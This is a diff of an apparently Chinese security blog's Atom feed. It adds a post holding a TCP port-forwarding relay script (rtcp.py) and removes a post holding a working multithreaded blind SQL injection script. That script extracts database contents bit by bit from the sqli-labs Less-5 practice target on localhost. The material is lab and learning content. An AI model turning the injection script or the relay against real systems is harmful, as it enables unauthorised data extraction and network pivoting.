@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-17T07:43:42.476Z</updated>
+  <updated>2018-12-17T12:15:35.665Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>rtcp.py</title>
+    <link href="http://yoursite.com/2018/12/17/rtcp-py/"/>
+    <id>http://yoursite.com/2018/12/17/rtcp-py/</id>
+    <published>2018-12-17T12:15:04.000Z</published>
+    <updated>2018-12-17T12:15:35.665Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>import socketimport sysimport threadingimport timestreams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）debug = 1  # 调试状态 0 or 1def _usage():    print(&apos;Usage: ./rtcp.py stream1 stream2\nstream: l:port  or c:host:port&apos;)def _get_another_stream(num):    &quot;&quot;&quot;    从streams获取另外一个流对象，如果当前为空，则等待    &quot;&quot;&quot;    if num == 0:        num = 1    elif num == 1:        num = 0    else:        raise NameError(&apos;error&apos;)    while True:        if streams[num] == &apos;quit&apos;:            print(&apos;can not connect to the target, quit now!&apos;)            sys.exit(1)        if streams[num] is not None:            return streams[num]        else:            time.sleep(1)def _xstream(num, s1, s2):    &quot;&quot;&quot;    交换两个流的数据    num为当前流编号,主要用于调试目的，区分两个回路状态用。    &quot;&quot;&quot;    try:        while True:            # 注意，recv 函数会阻塞，直到对端完全关闭（close 后还需要一定时间才能关闭，最快关闭方法是 shutdow）            buff = s1.recv(1024)            if debug &gt; 0:                print(&apos;%d recv&apos; % num)            if len(buff) == 0:  # 对端关闭连接，读不到数据                print(&apos;%d one closed&apos; % num)                break            s2.sendall(buff)            if debug &gt; 0:                print(&apos;%d sendall&apos; % num)    except:        print(&apos;%d one connect closed.&apos; % num)    try:        s1.shutdown(socket.SHUT_RDWR)        s1.close()    except:        pass    try:        s2.shutdown(socket.SHUT_RDWR)        s2.close()    except:        pass    streams[0] = None    streams[1] = None    print(&apos;%d CLOSED&apos; % num)def _server(port, num):    &quot;&quot;&quot;    处理服务情况，num 为流编号（第 0 号还是第 1 号）    &quot;&quot;&quot;    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    # 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。    srv.bind((&apos;0.0.0.0&apos;, port))    # 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。    srv.listen(1)    while True:        # 被动接受TCP客户端连接,(阻塞式)等待连接的到来        conn, addr = srv.accept()        print(&apos;connected from: %s&apos; % str(addr))        streams[num] = conn  # 放入本端流对象        # 获取另一端流对象        s2 = _get_another_stream(num)        _xstream(num, conn, s2)def _connect(host, port, num):    &quot;&quot;&quot;处理连接，num 为流编号（第 0 号还是第 1 号）    @note: 如果连接不到远程，会 sleep 36s，最多尝试 200（即两小时）    &quot;&quot;&quot;    not_connet_time = 0    wait_time = 36    try_cnt = 199    while True:        if not_connet_time &gt; try_cnt:            streams[num] = &apos;quit&apos;            print(&apos;not connected&apos;)            return None        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        try:            conn.connect((host, port))        except Exception:            print(&apos;can not connect %s:%s!&apos; % (host, port))            not_connet_time += 1            time.sleep(wait_time)            continue        print(&apos;connected to %s:%i&apos; % (host, port))        streams[num] = conn  # 放入本端流对象        s2 = _get_another_stream(num)  # 获取另一端流对象        _xstream(num, conn, s2)def main():    # if len(sys.argv) != 3:    #     _usage()    #     sys.exit(1)    tlist = []  # 线程列表，最终存放两个线程对象    # targv = [sys.argv[1], sys.argv[2]]    targv = [&quot;l:4567&quot;, &quot;c:127.0.0.1:80&quot;]    for i in [0, 1]:        s = targv[i]  # stream 描述 c:ip:port 或 l:port        sl = s.split(&apos;:&apos;)        if len(sl) == 2 and (sl[0] == &apos;l&apos; or sl[0] == &apos;L&apos;):  # l:port            t = threading.Thread(target=_server, args=(int(sl[1]), i))            tlist.append(t)        elif len(sl) == 3 and (sl[0] == &apos;c&apos; or sl[0] == &apos;C&apos;):  # c:host:port            t = threading.Thread(target=_connect, args=(sl[1], int(sl[2]), i))            tlist.append(t)        else:            _usage()            sys.exit(1)    for t in tlist:        t.start()    for t in tlist:        t.join()    sys.exit(0)if __name__ == &apos;__main__&apos;:    main()</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;import socket
+import sys
+import threading
+import time
+streams = [None, None]  # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象）
+debug = 1  # 调试
+      
+    
+    </summary>
+    
+      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>动态二进制加密实现一句话木马（冰蝎）</title>
@@ -478,33 +506,6 @@ whoami /priv 查看当前用户的权限
     </summary>
     
       <category term="加密解密" scheme="http://yoursite.com/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>比二分法更OK的盲注多线程</title>
-    <link href="http://yoursite.com/2018/12/03/%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
-    <id>http://yoursite.com/2018/12/03/比二分法更OK的盲注多线程/</id>
-    <published>2018-12-03T08:15:08.000Z</published>
-    <updated>2018-12-03T08:19:08.702Z</updated>
-    
-    <content type="html"><![CDATA[<p>废话不多说，直接上脚本：</p><pre><code>import threadingimport requestsuser_agent = [            &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;]class MyThread(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func = func        self.args = args    def getresult(self):        return self.res    def run(self):        self.res = self.func(*self.args)def asc(a,i,payload):    asci = 2**i    url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot;    header = {&apos;User-Agent&apos;: user_agent[i]}    html = requests.get(url, headers=header)    if html.text.find(&quot;You are in...........&quot;)!=-1:        return asci    return 0def main():    payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;)    a=1    f=True    char = &apos;&apos;    while f:        threads = []        sum = 0        for i in range(0,8):            t = MyThread(asc, (a, i, payload))            threads.append(t)        for i in range(0,8):            threads[i].start()        for i in range(0,8):            threads[i].join()            sum = sum + threads[i].getresult()        if sum ==0:            f = False        char = char +chr(sum)        a = a+1    print(char)if __name__ == &apos;__main__&apos;:    main()</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmpo7ywrj3118044q3h.jpg" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;废话不多说，直接上脚本：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import threading
-import requests
-user_agent = [
-            &amp;quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/53
-      
-    
-    </summary>
-    
-      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
     
     
   </entry>
